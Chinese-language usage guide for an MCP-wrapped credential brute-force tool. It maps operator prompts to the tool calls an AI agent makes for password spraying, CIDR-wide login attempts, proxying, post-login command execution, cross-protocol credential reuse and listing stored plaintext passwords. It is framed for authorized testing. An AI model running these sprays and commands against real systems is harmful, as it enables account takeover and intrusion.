# brute MCP 自然语言使用示例

本文面向已经把 `brute mcp` 接到 LLM 宿主的操作员. 每一节先给出**对模型说的话**, 再给出模型应调用的 **MCP tool** 与参数, 最后给出典型 JSON 结果. 仅用于授权评估、实验环境和已获准测试的资产.

启动方式与宿主配置见 [README.md](../README.md) 的 MCP Server 一节. 工具实现见 `src/mcp/`.

## 工具速查

| 工具 | 何时用 |
|---|---|
| `list_protocols` | 不知道 brute 支持哪些协议, 或要确认默认端口 |
| `list_workspaces` | 不知道当前 workspace, 或要按项目隔离查询 |
| `verify_account` | 只验 **一个目标 + 一组用户名/密码** (或一个已保存 `credential_id`) |
| `spray_passwords` | 多个目标、多个用户、多个密码, 或字典文件 |
| `list_credentials` | 查询已经验证并写入 `~/.config/brute/brute.db` 的凭据 |

协议名: `ssh`, `ftp`, `mysql`, `postgresql` (别名 `postgres`), `redis`, `oracle`, `tomcat` (别名 `tomcat-manager`), `smb`, `rdp`, `winrm`, `http`, `vnc`, `zookeeper` (别名 `zk`).

`verify_account` 与 `spray_passwords` 共用 `options`:

| 字段 | 含义 | 默认 |
|---|---|---|
| `port` | 覆盖协议默认端口 | 协议默认端口 |
| `timeout_ms` | 单次尝试超时 (毫秒) | `5000` |
| `retries` | 传输层临时错误重试次数 | `3` |
| `proxy` | `http://[user[:pass]@]host:port` 或 `socks5://...` | 无 |
| `workspace` | 保存成功凭据 / 读取 `--id` 的 workspace | 当前 workspace |
| `execute` | 认证成功后的命令. 仅 `ssh`/`ftp`/`mysql`/`postgresql`/`redis`/`oracle`/`winrm`/`zookeeper` | 无 |
| `path` | HTTP / Tomcat 请求路径 | http=`/`, tomcat=`/manager/html` |
| `url_scheme` | `http` 或 `https` | `http` |
| `service_names` | Oracle Service Name 或多值/字典路径. 与 `sids` 互斥 | 空 |
| `sids` | Oracle SID 或多值/字典路径. 与 `service_names` 互斥 | 空 |
| `shares` | SMB 认证成功后枚举 share/Access | `false` |
| `shell_type` | WinRM: `cmd` 或 `powershell` | 省略时 `-x` 用 powershell |

约束:

- `username`/`password` 与 `credential_id` 互斥.
- Oracle 必须且只能提供 `service_names` 或 `sids`.
- 空用户名/空密码传 `""`, 不要省略字段后指望模型猜.
- 字典文件路径存在且为文件时按行展开 (与 CLI `-u`/`-p` 相同). `targets` 同样接受 IPv4 CIDR, 会展开为前缀内全部地址 (含网络/广播, 单个前缀最多 65536 个). 不支持 IPv6.
- 成功登录会写入所选 workspace; 认证后命令失败不会丢掉已验证凭据.

---

## 0. 先摸清能力和 workspace

### 自然语言

```text
先看看 brute 支持哪些协议, 以及现在用的是哪个 workspace.
```

### 模型应调用

```json
{ "tool": "list_protocols", "arguments": {} }
```

```json
{ "tool": "list_workspaces", "arguments": {} }
```

### 典型结果

```json
[
  { "name": "ssh", "default_port": 22 },
  { "name": "ftp", "default_port": 21 },
  { "name": "mysql", "default_port": 3306 },
  { "name": "postgresql", "default_port": 5432 },
  { "name": "redis", "default_port": 6379 },
  { "name": "tomcat", "default_port": 8080 },
  { "name": "smb", "default_port": 445 },
  { "name": "rdp", "default_port": 3389 },
  { "name": "winrm", "default_port": 5985 },
  { "name": "oracle", "default_port": 1521 },
  { "name": "http", "default_port": 80 },
  { "name": "vnc", "default_port": 5900 },
  { "name": "zookeeper", "default_port": 2181 }
]
```

```json
[
  { "name": "default", "is_current": true },
  { "name": "project-a", "is_current": false }
]
```

后续验证/喷洒若要写入 `project-a`, 在 `options.workspace` 里显式传入 `"project-a"`. MCP 不会切换全局 current workspace.

---

## 1. 验证单个账户是否有效

场景: 授权内网里有一台 SSH, 只想确认 `admin` / `Summer2024!` 能不能登.

### 自然语言

```text
帮我验证 192.168.10.5 的 SSH 账户 admin / Summer2024! 是否有效.
如果能登录, 执行 id 看一下权限.
```

### 模型应调用

```json
{
  "tool": "verify_account",
  "arguments": {
    "protocol": "ssh",
    "target": "192.168.10.5",
    "username": "admin",
    "password": "Summer2024!",
    "options": {
      "execute": "id"
    }
  }
}
```

### 典型成功结果

`status` 为 `success` / `failure` / `error`. `successes` 是 `attempts` 里成功项的子集. 成功后该凭据已写入当前 workspace.

```json
{
  "workspace": "default",
  "protocol": "ssh",
  "probes": [
    {
      "host": "192.168.10.5",
      "port": 22,
      "message": "SSH-2.0-OpenSSH_9.2"
    }
  ],
  "attempts": [
    {
      "protocol": "ssh",
      "host": "192.168.10.5",
      "port": 22,
      "username": "admin",
      "password": "Summer2024!",
      "service_name": null,
      "sid": null,
      "status": "success",
      "message": "Linux - Shell access!",
      "post_auth": "uid=1000(admin) gid=1000(admin) groups=1000(admin)"
    }
  ],
  "successes": [
    {
      "protocol": "ssh",
      "host": "192.168.10.5",
      "port": 22,
      "username": "admin",
      "password": "Summer2024!",
      "service_name": null,
      "sid": null,
      "status": "success",
      "message": "Linux - Shell access!",
      "post_auth": "uid=1000(admin) gid=1000(admin) groups=1000(admin)"
    }
  ],
  "skipped": 0
}
```

### 典型失败结果

认证被拒时 `status` 为 `failure`, `successes` 为空. 端口不可达或超时为 `error`.

```json
{
  "workspace": "default",
  "protocol": "ssh",
  "probes": [],
  "attempts": [
    {
      "protocol": "ssh",
      "host": "192.168.10.5",
      "port": 22,
      "username": "admin",
      "password": "wrong",
      "service_name": null,
      "sid": null,
      "status": "failure",
      "message": "authentication failed",
      "post_auth": null
    }
  ],
  "successes": [],
  "skipped": 0
}
```

### 模型应向用户转述

```text
SSH 192.168.10.5:22 上 admin / Summer2024! 验证成功, 已写入 workspace default.
执行 id 的结果: uid=1000(admin) gid=1000(admin) groups=1000(admin).
```

---

## 2. 密码喷洒

场景: 一批 Windows 主机, 用常见用户名和季节口令做喷洒. 每个目标命中一组后默认停止; 要扫完所有用户需加 `continue_on_success`.

### 自然语言

```text
对 10.10.50.10 和 10.10.50.11 做 WinRM 密码喷洒.
用户: administrator, backup, svc-web
密码: Welcome1, Spring2024!, P@ssw0rd
并发 8, 命中后继续试其他账号.
走 socks5://127.0.0.1:1080.
```

### 模型应调用

```json
{
  "tool": "spray_passwords",
  "arguments": {
    "protocol": "winrm",
    "targets": ["10.10.50.10", "10.10.50.11"],
    "usernames": ["administrator", "backup", "svc-web"],
    "passwords": ["Welcome1", "Spring2024!", "P@ssw0rd"],
    "threads": 8,
    "continue_on_success": true,
    "options": {
      "proxy": "socks5://127.0.0.1:1080"
    }
  }
}
```

展开空间: `2 目标 × 3 用户 × 3 密码 = 18` 组. `continue_on_success=false` (默认) 时, 每个目标命中 1 组后跳过剩余组合, `skipped` 会增加.

### 用字典文件

```text
对 targets.txt 里的主机做 SSH 喷洒, 用户字典 users.txt, 密码字典 pass.txt, 端口 2222, 超时 3 秒.
```

```json
{
  "tool": "spray_passwords",
  "arguments": {
    "protocol": "ssh",
    "targets": ["targets.txt"],
    "usernames": ["users.txt"],
    "passwords": ["pass.txt"],
    "threads": 16,
    "options": {
      "port": 2222,
      "timeout_ms": 3000
    }
  }
}
```

路径必须是 **brute 进程能读到的本地文件**. 模型工作目录里的相对路径若 MCP 宿主 cwd 不同会读失败.

### CIDR 目标

```text
对 10.10.50.24/29 做 Tomcat 喷洒, 用户 admin, 密码 admin123.
```

```json
{
  "tool": "spray_passwords",
  "arguments": {
    "protocol": "tomcat",
    "targets": ["10.10.50.24/29"],
    "usernames": ["admin"],
    "passwords": ["admin123"]
  }
}
```

`10.10.50.24/29` 展开为 8 个主机 (`10.10.50.24` .. `10.10.50.31`), 再与用户名/密码做笛卡尔积.


### 模型应向用户转述

```text
WinRM 喷洒完成, workspace=default.
10.10.50.10 命中 administrator / P@ssw0rd.
10.10.50.11 没有命中.
成功凭据已写入本地数据库, 可用 list_credentials 再查.
```

---

## 3. 查询已经验证的凭据

### 自然语言

```text
把目前已经打下来的凭据都列出来.
只要 SSH, 主机 192.168.10.5.
```

### 模型应调用

先确认 workspace, 再过滤查询:

```json
{ "tool": "list_workspaces", "arguments": {} }
```

```json
{
  "tool": "list_credentials",
  "arguments": {
    "protocol": "ssh",
    "host": "192.168.10.5"
  }
}
```

查指定项目 workspace:

```text
查 project-a 里所有已验证凭据, 不要按协议过滤.
```

```json
{
  "tool": "list_credentials",
  "arguments": {
    "workspace": "project-a"
  }
}
```

`host` 是精确匹配, 不是子串.

### 典型结果

```json
[
  {
    "id": 3,
    "workspace": "default",
    "protocol": "ssh",
    "host": "192.168.10.5",
    "port": 22,
    "username": "admin",
    "password": "Summer2024!",
    "conn_url": "ssh://admin:Summer2024%21@192.168.10.5:22"
  }
]
```

结果含明文密码. 不要把整表贴到未授权频道.

### 模型应向用户转述

```text
当前 workspace default 中, 192.168.10.5 的 SSH 已验证凭据:
- id=3  admin / Summer2024!  端口 22
  conn_url=ssh://admin:Summer2024%21@192.168.10.5:22
```

---

## 4. 复用已保存凭据做跨协议验证

`credential_id` 不校验原始 protocol, 便于测密码复用. 与 `username`/`password` 互斥.

### 自然语言

```text
刚才 SSH 打下来的那组凭据, 用同一套账号密码去试 192.168.10.5 的 SMB 和 WinRM.
SMB 成功后把 shares 列出来.
```

### 模型应调用

```json
{
  "tool": "list_credentials",
  "arguments": { "protocol": "ssh", "host": "192.168.10.5" }
}
```

假设返回 `id=3`:

```json
{
  "tool": "verify_account",
  "arguments": {
    "protocol": "smb",
    "target": "192.168.10.5",
    "credential_id": 3,
    "options": { "shares": true }
  }
}
```

```json
{
  "tool": "verify_account",
  "arguments": {
    "protocol": "winrm",
    "target": "192.168.10.5",
    "credential_id": 3,
    "options": {
      "execute": "whoami",
      "shell_type": "powershell"
    }
  }
}
```

同一密码喷到多台主机时用 `spray_passwords` + `credential_id`, 不要再填 `usernames`/`passwords`.

```text
用凭据 id 3 去喷 targets.txt 里所有主机的 RDP.
```

```json
{
  "tool": "spray_passwords",
  "arguments": {
    "protocol": "rdp",
    "targets": ["targets.txt"],
    "credential_id": 3
  }
}
```

---

## 5. 分协议自然语言对照

### HTTP Basic (含 HTTPS)

```text
验证 10.10.50.30:8443 上 HTTPS 的 admin / secret, 路径 /manager/html.
证书是自签的, 直接连.
```

```json
{
  "tool": "verify_account",
  "arguments": {
    "protocol": "http",
    "target": "10.10.50.30",
    "username": "admin",
    "password": "secret",
    "options": {
      "port": 8443,
      "path": "/manager/html",
      "url_scheme": "https"
    }
  }
}
```

HTTPS 默认跳过证书校验. `2xx` 与 `403` 记为命中 (`403` = 认证过但资源/角色不够); `401` 为失败.

### Tomcat Manager

```text
对 192.168.10.5:8080 的 Tomcat Manager 喷 user.txt 和 passwd.txt.
```

```json
{
  "tool": "spray_passwords",
  "arguments": {
    "protocol": "tomcat",
    "targets": ["192.168.10.5"],
    "usernames": ["user.txt"],
    "passwords": ["passwd.txt"],
    "options": {
      "port": 8080,
      "path": "/manager/html"
    }
  }
}
```

`tomcat-manager` 也可作协议名.

### Redis / VNC (密码为主)

```text
Redis 192.168.10.5 没有用户名, 试密码 redis123, 成功后跑 INFO server.
VNC 同网段那台只试密码 secret.
```

```json
{
  "tool": "verify_account",
  "arguments": {
    "protocol": "redis",
    "target": "192.168.10.5",
    "username": "",
    "password": "redis123",
    "options": { "execute": "INFO server" }
  }
}
```

```json
{
  "tool": "verify_account",
  "arguments": {
    "protocol": "vnc",
    "target": "192.168.10.5",
    "username": "",
    "password": "secret"
  }
}
```

经典 VNC Auth 忽略用户名; 对端若是 web-VNC HTTPS 网关, 模块会回退 HTTP Basic, 此时 `-u`/`-p` 都有意义.

### Oracle

```text
Oracle 库 cloud.home.lab:11521, Service Name 用 services.txt,
用户 users.txt, 密码 pass.txt, 枚举多个 service, 命中后继续.
```

```json
{
  "tool": "spray_passwords",
  "arguments": {
    "protocol": "oracle",
    "targets": ["cloud.home.lab"],
    "usernames": ["users.txt"],
    "passwords": ["pass.txt"],
    "continue_on_success": true,
    "options": {
      "port": 11521,
      "service_names": ["services.txt"]
    }
  }
}
```

单账户 + SID + 查询:

```text
用 APPUSER / PASSWORD 连 cloud.home.lab, SID=ORCL, 查 select * from dual.
```

```json
{
  "tool": "verify_account",
  "arguments": {
    "protocol": "oracle",
    "target": "cloud.home.lab",
    "username": "APPUSER",
    "password": "PASSWORD",
    "options": {
      "sids": ["ORCL"],
      "execute": "select * from dual"
    }
  }
}
```

不要同时传 `service_names` 和 `sids`.

### SMB / RDP / WinRM 域名用户

```text
用 CORP\jsmith / Winter2024! 验 10.10.20.8 的 RDP 和 SMB.
SMB 列出 shares.
```

```json
{
  "tool": "verify_account",
  "arguments": {
    "protocol": "rdp",
    "target": "10.10.20.8",
    "username": "CORP\\jsmith",
    "password": "Winter2024!"
  }
}
```

```json
{
  "tool": "verify_account",
  "arguments": {
    "protocol": "smb",
    "target": "10.10.20.8",
    "username": "CORP\\jsmith",
    "password": "Winter2024!",
    "options": { "shares": true }
  }
}
```

JSON 里反斜杠必须写成 `CORP\\jsmith`. 也可用 `jsmith@CORP`.

`smb` / `rdp` / `vnc` / `http` / `tomcat` 没有 `-x`. 命令执行请改 `ssh`/`winrm` 等支持模块.

### MySQL / PostgreSQL / FTP

```text
验 mysql db.internal 的 root / weakpass, 成功后 show databases.
再对 postgresql 192.168.10.5 用 pg_users.txt × pg_pass.txt 喷一遍, 成功后 select version().
FTP 那台用 users.txt / pass.txt, 成功后 PWD.
```

```json
{
  "tool": "verify_account",
  "arguments": {
    "protocol": "mysql",
    "target": "db.internal",
    "username": "root",
    "password": "weakpass",
    "options": { "execute": "show databases;" }
  }
}
```

```json
{
  "tool": "spray_passwords",
  "arguments": {
    "protocol": "postgresql",
    "targets": ["192.168.10.5"],
    "usernames": ["pg_users.txt"],
    "passwords": ["pg_pass.txt"],
    "options": { "execute": "select version();" }
  }
}
```

```json
{
  "tool": "spray_passwords",
  "arguments": {
    "protocol": "ftp",
    "targets": ["192.168.10.5"],
    "usernames": ["users.txt"],
    "passwords": ["pass.txt"],
    "options": { "execute": "PWD" }
  }
}
```

---

## 6. 推荐对话流程

一次授权评估里, 对模型这样下任务通常最稳:

```text
这是授权内网评估. 先 list_protocols 和 list_workspaces.
然后对 192.168.10.0 段里我点名的主机做验证, 不要自己扫网段.

1. 验证 SSH 192.168.10.5  root / toor, 成功就执行 id.
2. 用 users.txt 和 pass.txt 喷 192.168.10.10 的 SMB, 成功列 shares.
3. 列出当前 workspace 里所有已验证凭据, 按协议分组告诉我.
4. 把 SSH 命中的凭据 id 拿去试同一主机的 WinRM whoami.
```

模型应按顺序调用:

1. `list_protocols` / `list_workspaces`
2. `verify_account` (ssh + `execute=id`)
3. `spray_passwords` (smb + `options.shares=true`)
4. `list_credentials`
5. `verify_account` (winrm + `credential_id` + `execute=whoami`)

`targets` 会展开 IPv4 CIDR (含网络/广播地址, 单个前缀最多 65536 个地址). 不要让模型把 `/8` 这类超大网段或 IPv6 直接喷进去; IPv6 与超限 CIDR 会报错.

---

## 7. 模型常见误用

| 用户原话 | 错误做法 | 正确做法 |
|---|---|---|
| 试一下这个 Oracle | 只传 host/user/pass | 必须带 `options.service_names` 或 `options.sids` |
| 用刚才那组密码再喷 RDP | 同时传 `credential_id` 和 `usernames` | 只传 `credential_id` |
| Redis 没用户名 | 省略 `username` | 传 `"username": ""` |
| 查 10.10. 开头的凭据 | `host: "10.10."` | `host` 是精确匹配; 先全量 `list_credentials` 再过滤 |
| HTTPS 自签 | 找 CA 开关 | `url_scheme=https` 即可, 默认跳过证书校验 |
| 对 SMB 执行命令 | `options.execute` | SMB 用 `options.shares`; 命令改 WinRM/SSH |
| 字典在我笔记本上 | 传桌面相对路径 | 路径相对 **brute mcp 进程 cwd**, 或用绝对路径 |
| 把结果发到群里 | 原样贴全部 password | 摘要命中数和主机, 密码按需最小化披露 |

参数校验失败时 MCP 返回 `invalid_params` (例如 Oracle 缺少 SID、`credential_id` 与用户名同时出现). 网络/协议错误在报告的 `attempts[].status=error` 里, 不是工具调用失败.

---

## 8. 和 CLI 的对应关系

同一件事可以用 CLI 或 MCP, 结果进同一个库.

| 自然语言意图 | CLI | MCP |
|---|---|---|
| 验一个 SSH 账户 | `brute ssh 192.168.10.5 -u admin -p 'Summer2024!' -x id` | `verify_account` |
| 喷 WinRM | `brute winrm 10.10.50.10 -u users.txt -p pass.txt --threads 8 --continue-on-success` | `spray_passwords` |
| 查已保存凭据 | `brute creds list --protocol ssh --host 192.168.10.5` | `list_credentials` |
| 复用凭据 id 3 | `brute smb 192.168.10.5 --id 3 --shares` | `verify_account` + `credential_id=3` + `options.shares` |
| 验 ZooKeeper / 未授权 | `brute zookeeper 192.168.5.10 -u '' -p ''` | `verify_account` protocol=zookeeper, username/password 为空串 |
| 执行 zk 命令 | `brute zookeeper 192.168.5.10 -u zkadmin -p '...' -x 'ls /'` | `verify_account` + `options.execute` |
| 走代理 | `brute --proxy socks5://127.0.0.1:1080 ssh ...` | `options.proxy` |

CLI 的 `--proxy` 是顶级参数, 写在子命令前. MCP 里代理放在 `options.proxy`.
